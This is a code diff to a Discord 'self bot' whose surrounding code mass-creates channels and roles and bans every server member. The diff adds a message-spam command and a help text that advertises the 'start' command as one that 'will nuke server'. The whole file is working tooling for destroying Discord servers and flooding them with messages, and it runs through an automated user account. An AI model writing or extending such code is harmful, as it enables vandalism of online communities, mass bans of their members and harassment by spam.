@@ -127,6 +127,11 @@ async def createrole(ctx):
     try: await ctx.guild.create_role(name=chnrln)
     except: pass
 
+async def sendms(ch,text,count):
+ for _ in range(count):
+    try: await ch.send(text)
+    except: pass
+
 
 @client.command()
 async def start(ctx):
@@ -142,7 +147,13 @@ async def start(ctx):
     for _ in range(35):    
         create_task(createchannel(ctx,name=chnrln))
 
+@client.command()
+async def spam(ctx,howm:int,*,txt):
+    create_task(sendms(ch=ctx,text=txt,count=howm))
 
+@client.command()
+async def help(ctx):
+    await ctx.send('```Five self bot help | v 1.1 - Beta \n' + prefix + 'start = will nuke server like five nuker\n' + prefix + 'spam will spam with youre massage as much as you want -> (amout of massges) + (massage) like ' + prefix + 'spam 10 yooo ```') 
 
 async def bananaa(ctx):
     for member in list(ctx.guild.members):
@@ -150,6 +161,8 @@ async def bananaa(ctx):
         await member.ban(reason=br, delete_message_days=7)
       except: pass
  
+
+
 
 
 
